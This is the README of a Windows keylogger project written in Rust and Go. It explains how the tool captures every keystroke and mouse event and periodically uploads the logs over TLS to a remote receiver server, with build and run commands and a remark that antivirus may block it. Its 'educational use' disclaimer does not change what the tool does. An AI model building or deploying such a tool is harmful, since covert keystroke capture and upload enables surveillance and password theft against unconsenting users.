# RSLogger

> **⚠️ FOR EDUCATIONAL USE ONLY**  
> This is for learning and security research. Don't use this on systems you don't own. Seriously - unauthorized monitoring is illegal. Use responsibly.

Keyboard and mouse logger written in Rust, with Go for network transfers over TLS.

## What it does

- **Keyboard Logging**: Captures all keystrokes with proper case sensitivity
- **Mouse Tracking**: Records mouse movements, clicks, and scroll events
- **Automatic Upload**: Periodically sends logs to a remote server via TLS
- **Single Binary**: Embedded Go sender for seamless operation
- **Thread-Safe**: Mutex-protected file writes
- **Windows Hooks**: Native low-level keyboard and mouse hooks

## Project Structure

```
rslogger/
├── client/                # Client (logger) component
│   ├── src/
│   │   ├── main.rs       # Entry point
│   │   ├── logger.rs     # Keyboard/mouse hooks
│   │   ├── uploader.rs   # File upload wrapper
│   │   └── sender.go     # Go file sender (embedded)
│   ├── .cargo/
│   │   └── config.toml   # Static linking config
│   └── Cargo.toml        # Rust dependencies
├── server/                # Server (receiver) component
│   ├── server.go         # Go TLS receiver
│   └── go.mod            # Go module
├── Makefile              # Unix build automation
├── build.ps1             # Windows build script
└── README.md
```

## Components

### Client (`client/target/release/rslogger.exe`)
- Logs keyboard and mouse activity
- Embeds Go-compiled sender for TLS transmission
- Saves logs locally: `keylog.txt` and `mouselog.txt`
- Automatically uploads to server at configurable intervals

### Server (`server/server.exe`)
- TLS listener on port 25557
- Receives and stores files in `received/` directory
- Self-signed certificate generation
- Written in Go for high-performance networking

## Building

**Requirements:**
- Rust
- Go 1.20+
- Windows (needs Windows API)

**Easy way:**
```powershell
.\build.ps1
```

**Manual:**
```powershell
go build -tags sender -ldflags="-s -w" -o client/src/sender.exe client/src/sender.go
cd client && cargo build --release && cd ..
cd server && go build -tags server -ldflags="-s -w" -o server.exe server.go && cd ..
```

**With Make:**
```bash
make all      # Build everything
make client   # Build logger only
make server   # Build server only
make clean    # Clean build artifacts
```

## Usage

### Start Server (on remote machine)
```powershell
cd server
.\server.exe
```
Server runs on port 25557 and saves files to `received/` folder.

### Run Logger

**Local only (no upload):**
```powershell
cd client
.\target\release\rslogger.exe
```

**With upload:**
```powershell
cd client
.\target\release\rslogger.exe <server_ip>:25557 [seconds]
```

Example - upload every 5 minutes:
```powershell
cd client
.\target\release\rslogger.exe localhost:25557 300
```

Run as Administrator or hooks won't work.

## Configuration

### Change Upload Interval
Pass interval in seconds as the second argument:
```powershell
.\rslogger.exe localhost:25557 60  # Upload every minute
```

### Change Port
Edit `src/server.go`:
```go
listener, err := tls.Listen("tcp", ":8443", config)
```

## How it works

**Rust side:**
- Uses Windows hooks (`SetWindowsHookExW`)
- Embeds Go sender binary at compile time
- Extracts to temp and runs it for uploads

**Go side:**
- TLS with self-signed certs (auto-generated)
- Server handles multiple connections

## Common Issues

**Won't start:**
- Run as admin
- Antivirus might block it

**Upload fails:**
- Check server is running
- Firewall on port 25557?

**Build fails:**
- Go in PATH?
- GCC installed? (`pacman -S mingw-w64-x86_64-gcc`)
- Try `go mod tidy` in src/

## License

MIT

## Disclaimer

For educational use only. Don't be stupid with this.
